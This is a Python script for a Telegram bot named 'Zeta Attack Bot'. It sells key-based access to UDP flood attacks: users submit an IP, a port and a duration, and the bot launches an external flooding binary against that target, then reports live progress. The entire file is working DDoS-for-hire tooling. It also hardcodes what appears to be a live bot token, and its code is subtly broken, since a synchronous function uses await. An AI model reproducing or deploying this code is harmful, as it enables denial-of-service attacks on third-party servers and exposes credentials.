#!/usr/bin/env python3
import os
import subprocess
import threading
import json
import random
import string
import time
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ============================================================
# CONFIGURATION
# ============================================================
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8402168828:AAHTB8REJZNq8cUvmEMcnaAgowk46uB8GkI')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 6465928598))

DATA_FILE = "zeta_users.json"
KEYS_FILE = "generated_keys.json"
BINARY_PATH = "./bgmi_beast"

active_attacks = {}
attack_lock = threading.Lock()

# Store attack info for completion messages
attack_info = {}  # {chat_id: {'target': str, 'duration': int, 'start_time': float, 'message_id': int}}

# ============================================================
# HELPER FUNCTIONS
# ============================================================
def load_json(filepath, default):
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            return json.load(f)
    return default

def save_json(filepath, data):
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=4)

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_approved(user_id):
    data = load_json(DATA_FILE, {})
    user_data = data.get(str(user_id))
    if not user_data:
        return False
    expiry = datetime.fromisoformat(user_data.get('expiry', '2000-01-01'))
    return expiry > datetime.now()

def get_user_info(user_id):
    data = load_json(DATA_FILE, {})
    return data.get(str(user_id))

def generate_key(days):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    expiry = (datetime.now() + timedelta(days=days)).isoformat()
    keys_data = load_json(KEYS_FILE, {})
    keys_data[key] = expiry
    save_json(KEYS_FILE, keys_data)
    return key

def redeem_key(user_id, key):
    keys_data = load_json(KEYS_FILE, {})
    if key not in keys_data:
        return False, "❌ Invalid key"
    expiry = datetime.fromisoformat(keys_data[key])
    if expiry < datetime.now():
        del keys_data[key]
        save_json(KEYS_FILE, keys_data)
        return False, "❌ Key expired"
    
    data = load_json(DATA_FILE, {})
    data[str(user_id)] = {'approved_by': 'key', 'expiry': expiry.isoformat(), 'redeemed_at': datetime.now().isoformat()}
    save_json(DATA_FILE, data)
    
    del keys_data[key]
    save_json(KEYS_FILE, keys_data)
    return True, f"✅ Access granted until {expiry.strftime('%Y-%m-%d %H:%M:%S')}"

def format_progress_bar(percent, width=25):
    filled = int(width * percent / 100)
    bar = '█' * filled + '░' * (width - filled)
    return bar

def run_attack(chat_id, target_ip, port, duration, method="udp", threads=16, bot=None, start_msg_id=None):
    global active_attacks
    cmd = [BINARY_PATH, target_ip, str(port), str(duration), str(threads), method]
    
    start_time = time.time()
    target = f"{target_ip}:{port}"
    
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        with attack_lock:
            active_attacks[chat_id] = {
                'target': target,
                'start_time': start_time,
                'duration': duration,
                'process': process,
                'method': method,
                'threads': threads,
                'ip': target_ip,
                'port': port
            }
        
        # Wait for attack to complete
        process.wait()
        
        # Attack finished - remove from active attacks
        with attack_lock:
            if chat_id in active_attacks:
                del active_attacks[chat_id]
        
        # Send completion message
        if bot:
            elapsed = time.time() - start_time
            completion_msg = (
                f"✅ <b>✅ ATTACK COMPLETED ✅</b> ✅\n\n"
                f"🎯 <b>Target:</b> <code>{target}</code>\n"
                f"⏱️ <b>Duration:</b> {duration} seconds\n"
                f"📊 <b>Actual time:</b> {int(elapsed)} seconds\n"
                f"⚡ <b>Method:</b> UDP Flood\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔥 <i>Attack session finished successfully!</i>\n"
                f"📌 <i>Use /attack to start a new one</i>"
            )
            
            try:
                # Try to edit the original message first
                if start_msg_id:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=start_msg_id,
                        text=completion_msg,
                        parse_mode='HTML'
                    )
                else:
                    # Send new message
                    await bot.send_message(
                        chat_id=chat_id,
                        text=completion_msg,
                        parse_mode='HTML'
                    )
            except Exception as e:
                print(f"Completion message error: {e}")
                # Fallback to send new message
                try:
                    await bot.send_message(
                        chat_id=chat_id,
                        text=completion_msg,
                        parse_mode='HTML'
                    )
                except:
                    pass
                
    except Exception as e:
        print(f"Attack error: {e}")
        with attack_lock:
            if chat_id in active_attacks:
                del active_attacks[chat_id]
        
        # Send error message
        if bot:
            try:
                await bot.send_message(
                    chat_id=chat_id,
                    text=f"❌ <b>Attack failed</b>\n\nError: {str(e)[:200]}",
                    parse_mode='HTML'
                )
            except:
                pass

# ============================================================
# BOT COMMAND HANDLERS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔥 <b>Welcome to Zeta Attack Bot</b> 🔥\n\n"
        "⚡ Powered by Zo, created by Alpha\n"
        "👑 <b>Owner:</b> @Yowai_mo_456\n\n"
        "📖 <b>Commands:</b>\n"
        "/help - Show all commands\n"
        "/myinfo - Your access info\n"
        "/status - View live attack progress\n"
        "/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - Launch attack\n"
        "/redeem &lt;key&gt; - Redeem access key"
    )
    await update.message.reply_text(msg, parse_mode='HTML')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Not approved. Use /redeem")
        return
    
    msg = (
        "🔧 <b>Zeta Bot Commands</b> 🔧\n\n"
        "<b>User Commands:</b>\n"
        "/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - Launch UDP flood\n"
        "/myinfo - Show your access expiry\n"
        "/status - Show live progress of running attacks\n"
        "/redeem &lt;key&gt; - Redeem access key\n"
        "/help - This message\n\n"
        "<b>Admin Commands:</b>\n"
        "/approve &lt;user_id&gt; &lt;days&gt; - Grant access\n"
        "/genkey &lt;days&gt; - Generate redeem key\n\n"
        "<b>Example:</b>\n"
        "<code>/attack 1.1.1.1 10001 60</code>\n\n"
        "<i>You will receive an attack completion message automatically!</i>"
    )
    await update.message.reply_text(msg, parse_mode='HTML')

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    info = get_user_info(user_id)
    if not info:
        await update.message.reply_text("❌ No access found. Use /redeem or contact admin.")
        return
    
    expiry = datetime.fromisoformat(info['expiry'])
    remaining = expiry - datetime.now()
    days_left = remaining.days
    
    msg = f"📋 <b>Your Info</b>\n\n"
    msg += f"🆔 User ID: <code>{user_id}</code>\n"
    msg += f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n"
    msg += f"⏳ Days left: {days_left}\n"
    await update.message.reply_text(msg, parse_mode='HTML')

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Access denied.")
        return
    
    with attack_lock:
        if not active_attacks:
            await update.message.reply_text("✅ No active attacks running.")
            return
        
        msg = "🔥 <b>LIVE ATTACK STATUS</b> 🔥\n\n"
        
        for cid, attack in active_attacks.items():
            elapsed = time.time() - attack['start_time']
            duration = attack['duration']
            percent = min(100, (elapsed / duration) * 100)
            remaining = max(0, duration - elapsed)
            
            progress_bar = format_progress_bar(percent, 25)
            remaining_min = int(remaining // 60)
            remaining_sec = int(remaining % 60)
            elapsed_min = int(elapsed // 60)
            elapsed_sec = int(elapsed % 60)
            
            # Status icon based on progress
            if percent < 25:
                status_icon = "🔴 STARTING"
            elif percent < 50:
                status_icon = "🟠 FLOODING"
            elif percent < 75:
                status_icon = "🟡 INTENSE"
            elif percent < 100:
                status_icon = "🟢 MAXIMUM"
            else:
                status_icon = "✅ FINISHING"
            
            msg += f"🎯 <b>Target:</b> <code>{attack['target']}</code>\n"
            msg += f"📊 <b>Progress:</b> <code>[{progress_bar}]</code> <b>{percent:.1f}%</b>\n"
            msg += f"⏱️ <b>Elapsed:</b> {elapsed_min}m {elapsed_sec}s | <b>Remaining:</b> {remaining_min}m {remaining_sec}s\n"
            msg += f"⚡ <b>Status:</b> {status_icon}\n"
            msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        msg += f"<i>🔄 Send /status again to refresh progress</i>"
        
        await update.message.reply_text(msg, parse_mode='HTML')

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ You are not approved. Contact admin or use /redeem.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("⚠️ Usage: <code>/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt;</code>\nExample: <code>/attack 1.1.1.1 10001 60</code>", parse_mode='HTML')
        return
    
    target_ip = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
    except ValueError:
        await update.message.reply_text("❌ Port and duration must be numbers.")
        return
    
    if duration > 300:
        await update.message.reply_text("❌ Max duration is 300 seconds (5 minutes).")
        return
    
    # Check if already attacking
    with attack_lock:
        if chat_id in active_attacks:
            await update.message.reply_text("❌ You already have an active attack! Wait for it to finish.\n\nUse /status to check progress.")
            return
    
    # Send initial message
    start_msg = await update.message.reply_text(
        f"🔥 <b>ATTACK LAUNCHED</b> 🔥\n\n"
        f"🎯 <b>Target:</b> <code>{target_ip}:{port}</code>\n"
        f"⏱️ <b>Duration:</b> {duration} seconds\n"
        f"⚡ <b>Method:</b> UDP Flood\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>⚔️ Flooding target...</i>\n"
        f"<i>📊 Use /status to monitor progress</i>\n"
        f"<i>✅ You'll receive a completion message automatically!</i>",
        parse_mode='HTML'
    )
    
    # Launch attack thread with bot reference
    thread = threading.Thread(
        target=run_attack, 
        args=(chat_id, target_ip, port, duration, "udp", 16, context.bot, start_msg.message_id)
    )
    thread.daemon = True
    thread.start()

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if len(args) < 1:
        await update.message.reply_text("Usage: <code>/redeem &lt;key&gt;</code>", parse_mode='HTML')
        return
    
    key = args[0]
    success, msg = redeem_key(user_id, key)
    await update.message.reply_text(msg, parse_mode='HTML')

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only.")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: <code>/approve &lt;user_id&gt; &lt;days&gt;</code>", parse_mode='HTML')
        return
    
    try:
        target_id = int(args[0])
        days = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id or days.")
        return
    
    expiry = datetime.now() + timedelta(days=days)
    data = load_json(DATA_FILE, {})
    data[str(target_id)] = {'approved_by': 'admin', 'expiry': expiry.isoformat(), 'approved_at': datetime.now().isoformat()}
    save_json(DATA_FILE, data)
    
    await update.message.reply_text(f"✅ User <code>{target_id}</code> approved for {days} days.", parse_mode='HTML')

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only.")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: <code>/genkey &lt;days&gt;</code>", parse_mode='HTML')
        return
    
    try:
        days = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid days.")
        return
    
    key = generate_key(days)
    await update.message.reply_text(f"🔑 <b>Generated Key</b>\n\n<code>{key}</code>\n\nValid for {days} days.", parse_mode='HTML')

# ============================================================
# MAIN
# ============================================================
def main():
    print("🔥 Zo Bot is starting...")
    print(f"👑 Admin ID: {ADMIN_ID}")
    
    if not os.path.exists(BINARY_PATH):
        print(f"⚠️ Warning: Binary not found at {BINARY_PATH}")
        print("Make sure bgmi_beast is compiled")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("genkey", genkey))
    
    print("✅ Bot is running!")
    print("📊 Features:")
    print("   - /status shows live progress")
    print("   - Automatic attack completion messages")
    app.run_polling()

if __name__ == "__main__":
    main()
